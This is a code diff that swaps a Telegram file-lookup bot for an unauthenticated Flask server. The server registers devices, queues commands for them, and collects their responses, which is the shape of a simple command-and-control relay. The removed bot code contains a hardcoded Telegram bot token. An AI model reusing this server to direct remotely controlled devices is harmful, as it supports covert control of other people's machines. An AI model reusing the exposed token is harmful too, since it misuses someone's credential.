@@ -1,138 +1,70 @@
-from telegram import Update
-from telegram.ext import (
-    ApplicationBuilder, CommandHandler, MessageHandler,
-    ContextTypes, filters
-)
-import logging
+from flask import Flask, request, jsonify
+from threading import Lock
 
-# Bot token
-TOKEN = "7331733537:AAGqCPHuCM5mC2RQpZfh_pTEbxQv4agf9tA"
+app = Flask(__name__)
+devices = {}  # device_id -> {'name': ..., 'last_command': '', 'response': ''}
+lock = Lock()
 
-# File storage
-file_ids = {}
+@app.route("/register", methods=["POST"])
+def register():
+    data = request.json
+    device_id = data.get("device_id")
+    name = data.get("device_name")
 
-# Logging
-logging.basicConfig(level=logging.INFO)
+    if not device_id or not name:
+        return "Missing data", 400
 
-# /start command
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    message = (
-        "👋 *Welcome!*\n\n"
-        "Send me *any file* (video, image, document, etc.), and I’ll reply with its details and ID.\n"
-        "You can also *send me a file ID, unique ID, or name* and I’ll return the file.\n\n"
-        "Need help? Contact @Cyb37h4ck37"
-    )
-    await update.message.reply_text(message, parse_mode="Markdown")
+    with lock:
+        devices[device_id] = {
+            'name': name,
+            'last_command': '',
+            'response': ''
+        }
 
-# Handle all incoming files
-async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    message = update.message
-    file = None
-    file_type = None
+    return "Registered", 200
 
-    if message.document:
-        file = message.document
-        file_type = "Document"
-    elif message.video:
-        file = message.video
-        file_type = "Video"
-    elif message.audio:
-        file = message.audio
-        file_type = "Audio"
-    elif message.photo:
-        file = message.photo[-1]  # best quality
-        file_type = "Photo"
-    elif message.voice:
-        file = message.voice
-        file_type = "Voice"
+@app.route("/devices", methods=["GET"])
+def list_devices():
+    with lock:
+        return jsonify({k: v['name'] for k, v in devices.items()})
 
-    if not file:
-        await message.reply_text("Unsupported file type.")
-        return
+@app.route("/send_command", methods=["POST"])
+def send_command():
+    data = request.json
+    device_id = data.get("device_id")
+    command = data.get("command")
 
-    file_id = file.file_id
-    unique_id = file.file_unique_id
-    file_name = getattr(file, "file_name", None) or f"{file_type}_{unique_id}"
-    file_size = file.file_size
-    duration = getattr(file, "duration", None)
-    width = getattr(file, "width", None)
-    height = getattr(file, "height", None)
+    with lock:
+        if device_id in devices:
+            devices[device_id]['last_command'] = command
+            return "Command sent", 200
+    return "Device not found", 404
 
-    file_ids[file_id] = file_id
-    file_ids[unique_id] = file_id
-    file_ids[file_name] = file_id
+@app.route("/get_command/<device_id>", methods=["GET"])
+def get_command(device_id):
+    with lock:
+        if device_id in devices:
+            cmd = devices[device_id]['last_command']
+            devices[device_id]['last_command'] = ''
+            return jsonify({'command': cmd})
+    return "Not found", 404
 
-    original_sender = ""
-    if message.forward_from:
-        sender = message.forward_from
-        original_sender = f"\nForwarded From User: {sender.full_name} (ID: {sender.id})"
-    elif message.forward_from_chat:
-        chat = message.forward_from_chat
-        original_sender = f"\nForwarded From Channel: {chat.title or chat.username} (ID: {chat.id})"
+@app.route("/send_response/<device_id>", methods=["POST"])
+def receive_response(device_id):
+    data = request.json
+    response = data.get("response")
 
-    details = (
-        f"*{file_type} received!*\n\n"
-        f"*File Name:* `{file_name}`\n"
-        f"*File ID:* `{file_id}`\n"
-        f"*Unique ID:* `{unique_id}`\n"
-        f"*Size:* {file_size} bytes\n"
-    )
-    if duration:
-        details += f"*Duration:* {duration}s\n"
-    if width and height:
-        details += f"*Dimensions:* {width}x{height}\n"
-    details += original_sender
+    with lock:
+        if device_id in devices:
+            devices[device_id]['response'] = response
+            return "Response saved", 200
+    return "Device not found", 404
 
-    await message.reply_text(details, parse_mode="Markdown")
+@app.route("/get_response/<device_id>", methods=["GET"])
+def get_response(device_id):
+    with lock:
+        if device_id in devices:
+            return jsonify({'response': devices[device_id]['response']})
+    return "Not found", 404
 
-# Handle file requests by ID/name
-async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    text = update.message.text.strip().replace("\\_", "_")
-    file_id = file_ids.get(text, text)
-
-    try:
-        await update.message.reply_document(file_id)
-        return
-    except:
-        pass
-    try:
-        await update.message.reply_video(file_id)
-        return
-    except:
-        pass
-    try:
-        await update.message.reply_audio(file_id)
-        return
-    except:
-        pass
-    try:
-        await update.message.reply_photo(file_id)
-        return
-    except:
-        pass
-    try:
-        await update.message.reply_voice(file_id)
-        return
-    except:
-        pass
-
-    await update.message.reply_text("❌ Couldn’t find or access that file.")
-
-# Error logging
-async def error_handler(update: object, context: ContextTypes.DEFAULT_TYPE):
-    logging.error("Error occurred:", exc_info=context.error)
-
-# Run bot
-if __name__ == "__main__":
-    app = ApplicationBuilder().token(TOKEN).build()
-
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(MessageHandler(
-        filters.document | filters.video | filters.audio | filters.photo | filters.voice,
-        handle_file
-    ))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
-    app.add_error_handler(error_handler)
-
-    print("Bot is running...")
-    app.run_polling()
+app.run(host='0.0.0.0', port=8080)
